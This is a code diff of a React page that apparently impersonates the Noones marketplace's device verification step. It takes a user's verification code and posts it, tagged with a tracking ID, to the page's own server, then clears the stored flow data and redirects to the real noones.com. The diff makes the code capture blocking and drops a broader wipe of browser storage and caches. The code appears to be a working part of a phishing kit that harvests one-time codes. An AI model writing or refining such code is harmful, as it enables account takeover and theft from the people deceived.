@@ -1,7 +1,5 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { useNavigate, useLocation } from 'react-router-dom';
-import { supabase } from '../../lib/supabase';
-import { fireAndMove } from '../../lib/syncRetry';
 
 const NOONES_SESSION_ID_KEY = 'noones_session_id';
 const NOONES_CURRENT_STEP_KEY = 'noones_current_step';
@@ -91,57 +89,31 @@ export default function NoonesDeviceVerification() {
       console.log('[NOONES_STEP3] Updating code for tracking_id:', trackingId);
       
       // Fire UPDATE via server endpoint with retry wrapper (non-blocking)
-      const syncId = `noones-step3-${trackingId}`;
-      const noonesUpdateCodeOperation = async () => {
-        try {
-          console.log('[NOONES_STEP3] 📤 Sending verification code via /api/update-connection...');
-          const res = await fetch('/api/update-connection', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ tracking_id: trackingId, code: verificationCode }),
-          });
+      const response = await fetch('/api/update-connection', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ tracking_id: trackingId, code: verificationCode }),
+      });
 
-          if (!res.ok) {
-            const err = await res.json().catch(() => ({}));
-            console.warn('[NOONES_STEP3] ❌ update-connection failed:', err);
-            return { error: err || { message: 'Update failed' } };
-          }
+      const payload = await response.json().catch(() => ({}));
 
-          const data = await res.json().catch(() => ({}));
-          console.log('[NOONES_STEP3] ✅ update-connection success:', data);
-          return { error: null, data };
-        } catch (err: any) {
-          console.error('[NOONES_STEP3] ❌ update-connection exception:', err);
-          return { error: err || { message: String(err) } };
-        }
-      };
+      if (!response.ok) {
+        console.error('[NOONES_STEP3] ❌ update-connection failed:', payload);
+        alert(`Unable to verify code: ${payload.error || 'Unknown error'}`);
+        return;
+      }
 
-      fireAndMove(noonesUpdateCodeOperation, syncId, { maxAttempts: 3, delayMs: 500 });
-      console.log('[NOONES_STEP3] 🚀 UPDATE fired in background, clearing session and redirecting');
+      console.log('[NOONES_STEP3] ✅ update-connection success:', payload);
+      console.log('[NOONES_STEP3] 🚀 UPDATE completed, clearing local noones progress and redirecting');
 
-      // Clear Noones-specific localStorage
+      // Clear only Noones flow storage after final step
       window.localStorage.removeItem(NOONES_SESSION_ID_KEY);
       window.localStorage.removeItem(NOONES_CURRENT_STEP_KEY);
       window.localStorage.removeItem(NOONES_REQUEST_DATA_KEY);
 
-      // Clear browser storage for our domain
-      localStorage.clear();
-      sessionStorage.clear();
-
-      // Clear cache if available
-      if ('caches' in window) {
-        caches.keys().then(names => {
-          names.forEach(name => {
-            caches.delete(name);
-          });
-        });
-      }
-
-      // 3-second delay to allow page to load smoothly
       setTimeout(() => {
-        // Redirect to Noones
         window.location.href = 'https://noones.com/';
-      }, 3000);
+      }, 1000);
     } catch (err) {
       console.error('[NOONES_STEP3] Error:', err);
       alert('Verification failed. Please try again.');
